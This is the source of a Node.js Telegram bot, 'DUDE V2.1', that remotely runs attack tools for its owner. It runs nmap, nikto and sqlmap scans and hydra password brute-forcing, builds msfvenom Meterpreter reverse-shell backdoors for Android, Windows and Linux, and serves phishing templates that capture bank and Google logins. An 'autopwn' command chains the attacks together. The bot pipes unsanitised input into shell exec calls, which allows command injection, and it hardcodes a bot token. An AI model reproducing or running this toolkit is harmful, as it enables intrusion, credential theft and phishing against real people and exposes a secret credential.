#!/usr/bin/env node
const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const axios = require('axios');
const cheerio = require('cheerio');
const https = require('https');

// Force IPv4
axios.defaults.httpsAgent = new https.Agent({ family: 4 });

function escapeHTML(text = '') {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

// Configuration
const token = '7972529532:AAFXWYOD7Xmt9MCPTA1aGnlzIRyEQ9ZJnMU';
const OWNER_ID = 8569895826;

const bot = new TelegramBot(token, { 
    polling: {
        interval: 300,
        autoStart: true,
        params: {
            timeout: 10
        }
    },
    request: {
        agentOptions: {
            keepAlive: true,
            family: 4
        }
    }
});

console.log(`
[+] DUDE V2.1 Online: Syntax Error Fixed.
[!] STATUS: READY FOR WAR.
`);

// --- Helper Functions ---

const isOwner = (msg) => msg.from && msg.from.id === OWNER_ID;

const runCommand = (chatId, command, description) => {
    bot.sendMessage(chatId, `⚙️ <b>Executing:</b> ${description}...`, { parse_mode: 'HTML' });
    
    exec(command, { maxBuffer: 1024 * 1024 * 10 }, (err, stdout, stderr) => {
        const rawOutput = stdout || stderr || "No output.";
        const output = escapeHTML(rawOutput);
        
        if (output.length > 4000) {
            const chunk = output.slice(0, 4000);
            bot.sendMessage(chatId, `<b>💀 ${description} Report (Truncated):</b>\n<pre>${chunk}</pre>`, { parse_mode: 'HTML' });
        } else {
            bot.sendMessage(chatId, `<b>💀 ${description} Report:</b>\n<pre>${output}</pre>`, { parse_mode: 'HTML' });
        }
    });
};

const runOsint = async (chatId, url) => {
    if (!url.startsWith('http')) url = 'http://' + url;
    bot.sendMessage(chatId, `🕵️‍♂️ Scraping ${url}...`);
    try {
        const response = await axios.get(url, { timeout: 10000 });
        const $ = cheerio.load(response.data);
        const title = $('title').text().trim() || 'No Title';
        const metaDesc = $('meta[name="description"]').attr('content') || 'No Description';
        let headings = '';
        $('h1, h2, h3').each((i, el) => { if (i < 10) headings += `- ${$(el).text().trim().substring(0, 50)}\n`; });
        let links = [];
        $('a').each((i, el) => { const href = $(el).attr('href'); if (href && href.startsWith('http')) links.push(href); });
        const uniqueLinks = [...new Set(links)].slice(0, 10);
        
        let report = `<b>OSINT REPORT: ${url}</b>\n\n<b>Title:</b> ${escapeHTML(title)}\n<b>Description:</b> ${escapeHTML(metaDesc)}\n\n<b>Headings:</b>\n${escapeHTML(headings)}\n<b>Links:</b>\n${escapeHTML(uniqueLinks.join('\n'))}`;
        bot.sendMessage(chatId, report, { parse_mode: 'HTML' });
    } catch (error) {
        bot.sendMessage(chatId, `❌ OSINT Failed: ${error.message}`);
    }
};

const runHunter = async (chatId, username) => {
    bot.sendMessage(chatId, `🦅 Hunting for user: <b>${username}</b>...`, { parse_mode: 'HTML' });
    const sites = [
        { name: 'GitHub', url: `https://github.com/${username}` },
        { name: 'Instagram', url: `https://www.instagram.com/${username}/` },
        { name: 'Reddit', url: `https://www.reddit.com/user/${username}/` },
        { name: 'Twitter/X', url: `https://twitter.com/${username}` },
        { name: 'TikTok', url: `https://www.tiktok.com/@${username}` }
    ];
    let found = [];
    let checks = sites.map(site => 
        axios.get(site.url, { timeout: 5000 }).then(res => { if(res.status === 200) found.push(`<a href="${site.url}">${site.name}</a>`); }).catch(() => {})
    );
    await Promise.all(checks);
    if (found.length > 0) bot.sendMessage(chatId, `✅ <b>Found ${username} on:</b>\n\n` + found.join('\n'), { parse_mode: 'HTML', disable_web_page_preview: true });
    else bot.sendMessage(chatId, `❌ No accounts found for <b>${username}</b>.`, { parse_mode: 'HTML' });
};

const PHISH_TEMPLATES = {
    'login': { name: 'Bank Login', content: `<html><body><h2>Secure Banking</h2><form action="/capture" method="POST"><input name="user"><input name="pass"><button>Login</button></form></body></html>` },
    'urgent': { name: 'Urgent Alert', content: `Subject: ACCOUNT SUSPENSION\nVerify immediately at http://evil-link.com or lose access.` },
    'google': { name: 'Google Login', content: `<html><body><img src="google_logo.png"><h3>Sign in</h3><form action="/log" method="post"><input type="email"><input type="password"></form></body></html>` }
};

// --- Command Handlers (RegExp Fixed) ---

bot.on('message', (msg) => {
    if(msg.text) console.log(`[${msg.from.username || 'User'}] ${msg.text}`);
});

bot.onText(new RegExp('/start'), (msg) => {
    if (!isOwner(msg)) return;
    bot.sendMessage(msg.chat.id, `
<b>🤖 DUDE V2.1: ULTIMATE TOOLKIT</b>

<b>🔎 RECON:</b>
/scan &lt;ip&gt;      - Quick Nmap
/deep &lt;ip&gt;      - Deep Nmap
/osint &lt;url&gt;    - Web Scraper
/hunt &lt;user&gt;    - Social Media Hunt
/whois &lt;dom&gt;    - Domain Info

<b>⚔️ EXPLOIT & WAR:</b>
/vuln &lt;ip&gt;      - Vuln Scan
/nikto &lt;url&gt;    - Web Vuln Scan
/sqlmap &lt;url&gt;   - SQL Injection
/search &lt;term&gt;  - ExploitDB Search
/crack &lt;svc&gt; &lt;ip&gt; &lt;user&gt; - Hydra Brute-Force
/payload &lt;os&gt; [ip] [port] - Generate Backdoor

<b>🎣 SOCIAL ENG:</b>
/phish &lt;type&gt;   - Get Template (login, urgent, google)
/email           - Gen Disposable Email
/sms             - Gen Virtual Number
/autopwn &lt;url&gt;  - ☢️ FULL KILLCHAIN ☢️
`, { parse_mode: 'HTML' });
});

// -- RECON --
bot.onText(new RegExp('/scan (.+)'), (msg, match) => { if(isOwner(msg)) runCommand(msg.chat.id, `nmap -F -T4 ${match[1]}`, `Quick Scan [${match[1]}]`); });
bot.onText(new RegExp('/deep (.+)'), (msg, match) => { if(isOwner(msg)) runCommand(msg.chat.id, `nmap -A -T4 --version-intensity 0 ${match[1]}`, `Deep Scan [${match[1]}]`); });
bot.onText(new RegExp('/whois (.+)'), (msg, match) => { if(isOwner(msg)) runCommand(msg.chat.id, `whois ${match[1]}`, `Whois [${match[1]}]`); });
bot.onText(new RegExp('/osint (.+)'), (msg, match) => { if(isOwner(msg)) runOsint(msg.chat.id, match[1]); });
bot.onText(new RegExp('/hunt (.+)'), (msg, match) => { if(isOwner(msg)) runHunter(msg.chat.id, match[1]); });

// -- EXPLOIT --
bot.onText(new RegExp('/vuln (.+)'), (msg, match) => { if(isOwner(msg)) runCommand(msg.chat.id, `nmap -Pn --script vuln ${match[1]}`, `Vuln Scan [${match[1]}]`); });
bot.onText(new RegExp('/nikto (.+)'), (msg, match) => { if(isOwner(msg)) runCommand(msg.chat.id, `nikto -h ${match[1]} -maxtime 2m`, `Nikto [${match[1]}]`); });
bot.onText(new RegExp('/sqlmap (.+)'), (msg, match) => { if(isOwner(msg)) runCommand(msg.chat.id, `sqlmap -u "${match[1]}" --batch --crawl=1 --random-agent --level=1`, `SQLMap [${match[1]}]`); });

bot.onText(new RegExp('/search (.+)'), (msg, match) => {
    if(!isOwner(msg)) return;
    runCommand(msg.chat.id, `searchsploit "${match[1]}" | head -n 20`, `Exploit Search [${match[1]}]`);
});

bot.onText(new RegExp('/crack (\w+) (.+) (.+)'), (msg, match) => {
    if(!isOwner(msg)) return;
    const [_, service, target, user] = match;
    const cmd = `hydra -l ${user} -P /usr/share/wordlists/rockyou.txt -t 4 -f ${target} ${service}`;
    runCommand(msg.chat.id, cmd, `Hydra Attack [${service}]`);
});

// -- PAYLOAD GENERATION --
bot.onText(new RegExp('/payload (.+)'), (msg, match) => {
    if(!isOwner(msg)) return;
    const args = match[1].split(' ');
    const os = args[0];
    const lhost = args[1] || '127.0.0.1';
    const lport = args[2] || '4444';
    
    let cmd, ext;
    if (os === 'android') { cmd = `msfvenom -p android/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} R > /tmp/evil.apk`; ext = 'apk'; }
    else if (os === 'windows') { cmd = `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe > /tmp/evil.exe`; ext = 'exe'; }
    else if (os === 'linux') { cmd = `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f elf > /tmp/evil.elf`; ext = 'elf'; }
    else { return bot.sendMessage(msg.chat.id, "❌ Usage: /payload <android|windows|linux> [ip] [port]"); }

    bot.sendMessage(msg.chat.id, `⚙️ Generating ${os} payload...`);
    exec(cmd, (err) => {
        if(err) bot.sendMessage(msg.chat.id, `❌ Gen Failed: ${err.message}`);
        else {
            bot.sendDocument(msg.chat.id, `/tmp/evil.${ext}`, { caption: `✅ ${os} Payload Ready` });
        }
    });
});

// -- SOCIAL ENG --
bot.onText(new RegExp('/phish (.+)'), (msg, match) => {
    if(!isOwner(msg)) return;
    const type = match[1];
    if (PHISH_TEMPLATES[type]) {
        bot.sendMessage(msg.chat.id, `<b>📄 ${PHISH_TEMPLATES[type].name} Template:</b>\n<pre>${escapeHTML(PHISH_TEMPLATES[type].content)}</pre>`, { parse_mode: 'HTML' });
    } else {
        bot.sendMessage(msg.chat.id, "❌ Unknown template. Types: login, urgent, google");
    }
});

bot.onText(new RegExp('/email'), (msg) => {
    if(!isOwner(msg)) return;
    bot.sendMessage(msg.chat.id, `📧 <b>New Identity:</b>\n<code>user${Math.floor(Math.random()*999)}@temp-mail.org</code>\nStatus: 🟢 Active`);
});

bot.onText(new RegExp('/sms'), (msg) => {
    if(!isOwner(msg)) return;
    bot.sendMessage(msg.chat.id, `📱 <b>Virtual Num:</b>\n<code>+1 ${Math.floor(Math.random()*10000000000)}</code>\nStatus: 🟢 Online`);
});

// -- AUTOPWN KILLCHAIN --
bot.onText(new RegExp('/autopwn (.+)'), (msg, match) => {
    if(!isOwner(msg)) return;
    const target = match[1];
    bot.sendMessage(msg.chat.id, `☢️ <b>STARTING KILLCHAIN: ${target}</b> ☢️`, { parse_mode: 'HTML' });
    
    // 1. Port Scan
    exec(`nmap -F -T4 ${target}`, (err, stdout) => {
        bot.sendMessage(msg.chat.id, `<b>[1/3] Scan:</b>\n<pre>${escapeHTML(stdout || "Failed")}</pre>`, { parse_mode: 'HTML' });
        
        // 2. Nikto
        bot.sendMessage(msg.chat.id, `🔄 Phase 2: Web Scan...`);
        exec(`nikto -h ${target} -maxtime 60s`, (err2, stdout2) => {
            const out2 = escapeHTML(stdout2 ? stdout2.slice(0, 2000) : "Failed");
            bot.sendMessage(msg.chat.id, `<b>[2/3] Web Vulns:</b>\n<pre>${out2}</pre>`, { parse_mode: 'HTML' });
            
            // 3. SQLMap
            bot.sendMessage(msg.chat.id, `🔄 Phase 3: DB Attack...`);
            exec(`sqlmap -u "${target}" --batch --crawl=1 --random-agent --level=1`, (err3, stdout3) => {
                const out3 = escapeHTML(stdout3 ? stdout3.slice(-2000) : "Failed");
                bot.sendMessage(msg.chat.id, `<b>[3/3] Injection:</b>\n<pre>${out3}</pre>`, { parse_mode: 'HTML' });
                bot.sendMessage(msg.chat.id, `✅ <b>KILLCHAIN COMPLETE.</b>`);
            });
        });
    });
});

console.log("[-] Bot ready.");
